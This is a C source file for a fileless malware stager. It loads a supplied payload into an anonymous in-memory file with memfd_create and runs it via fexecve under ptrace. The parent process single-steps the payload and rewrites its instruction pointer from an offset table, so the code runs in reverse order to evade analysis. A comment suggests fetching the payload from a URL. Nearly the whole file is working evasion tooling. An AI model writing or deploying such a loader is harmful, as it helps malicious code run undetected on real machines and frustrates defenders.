#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <linux/memfd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include "config.h"

#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif

int open_ramfs(void) {
    int fd = syscall(__NR_memfd_create, "payload", 1);
    if (fd < 0) {
    	perror("memfd_create"); 
    	exit(-1); 
    }
    return fd;
}

size_t write_data(void *ptr, size_t size, size_t nmemb, int shm_fd) {
    ssize_t bytes = write(shm_fd, ptr, size * nmemb);
    if (bytes < 0) {
        close(shm_fd); 
        exit(-1);
    }
    return nmemb;
}

void run_target(int shm_fd) {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
        perror("PTRACE_TRACEME");
        exit(-1);
    }

    char *const argv[] = { "payload", NULL };
    char *const envp[] = { NULL };

    fexecve(shm_fd, argv, envp);
    perror("fexecve");
    exit(-1);
}

void run_debugger(pid_t child_pid) {
    int wait_status;
    unsigned icounter = 0;

    wait(&wait_status);

    while(WIFSTOPPED(wait_status)) {
    	icounter++;
    	struct user_regs_struct regs;
    	ptrace(PTRACE_GETREGS, child_pid, 0, &regs);
    	unsigned instr = ptrace(PTRACE_PEEKTEXT, child_pid, regs.rip, 0);

    	regs.rip = PAYLOAD_INSTRUCTION_OFFSETS[(PAYLOAD_ADDRESS_COUNT - 1) - icounter];
    	ptrace(PTRACE_SETREGS, child_pid, 0, &regs);

    	if(ptrace(PTRACE_SINGLESTEP, child_pid, 0, 0) < 0) {
    		return;
    	}

    	wait(&wait_status);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <payload>\n", argv[0]);
        return -1;
    }

    // Read payload (replace with some other logic like URL fetching)
    FILE *f = fopen(argv[1], "rb");
    if (!f) { 
    	perror("fopen"); 
    	return -1; 
    }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    void *buf = malloc(len);
    fread(buf, 1, len, f);
    fclose(f);

    // Load it in In-memory for execution
    int shm_fd = open_ramfs();
    write_data(buf, 1, len, shm_fd);
    free(buf);

    // Stager, reverse execution phase
    pid_t child = fork();
    if (child == 0) {
        run_target(shm_fd);
    } else if (child > 0) {
        run_debugger(child);
    } else {
        perror("fork");
        return -1;
    }

    return 0;
}